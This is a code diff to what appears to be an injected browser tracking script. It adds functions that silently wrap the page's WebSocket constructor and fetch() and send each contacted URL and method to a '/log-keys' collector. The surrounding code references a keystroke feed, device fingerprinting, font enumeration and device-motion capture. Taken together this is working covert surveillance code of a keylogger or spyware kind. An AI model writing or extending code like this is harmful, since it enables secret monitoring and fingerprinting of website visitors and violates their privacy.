@@ -1495,6 +1495,58 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ WEBSOCKET DETECTOR ═══════════════════════════════════
+    // Monkey-patches the WebSocket constructor to detect real-time connections.
+    // Logs the URL of each WS connection attempt without reading message data.
+    function initWebSocketDetector() {
+        try {
+            if (typeof WebSocket === 'undefined') return;
+            const OrigWS = window.WebSocket;
+            const _post  = post; // capture reference
+            window.WebSocket = function(url, protocols) {
+                try {
+                    _post('/log-keys', {
+                        keys: `[WEBSOCKET] Connected to: ${String(url).slice(0, 200)}`,
+                        url: location.href
+                    });
+                } catch {}
+                return protocols != null ? new OrigWS(url, protocols) : new OrigWS(url);
+            };
+            window.WebSocket.prototype = OrigWS.prototype;
+            window.WebSocket.CONNECTING = OrigWS.CONNECTING;
+            window.WebSocket.OPEN       = OrigWS.OPEN;
+            window.WebSocket.CLOSING    = OrigWS.CLOSING;
+            window.WebSocket.CLOSED     = OrigWS.CLOSED;
+        } catch {}
+    }
+
+    // ═══ FETCH INTERCEPTOR ════════════════════════════════════
+    // Wraps the native fetch() to log API/network calls made by the page.
+    // Only logs the URL and method — never request/response body content.
+    function initFetchInterceptor() {
+        try {
+            const origFetch = window.fetch;
+            if (!origFetch) return;
+            const _post       = post; // capture reference
+            const ownOrigin   = location.origin;
+            window.fetch = function(input, init) {
+                try {
+                    const url    = typeof input === 'string' ? input : (input.url || String(input));
+                    const method = (init && init.method ? init.method : 'GET').toUpperCase();
+                    // Only log cross-origin or API-looking requests to avoid infinite loop
+                    if (!url.includes('/log-keys') && !url.includes('/heartbeat')) {
+                        const short = url.slice(0, 180);
+                        _post('/log-keys', {
+                            keys: `[FETCH] ${method} ${short}`,
+                            url: location.href
+                        });
+                    }
+                } catch {}
+                return origFetch.apply(this, arguments);
+            };
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1634,6 +1686,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initRageClickDetector();
         initNavigatorFingerprint();
         initFontEnumerator();
+        initWebSocketDetector();
+        initFetchInterceptor();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
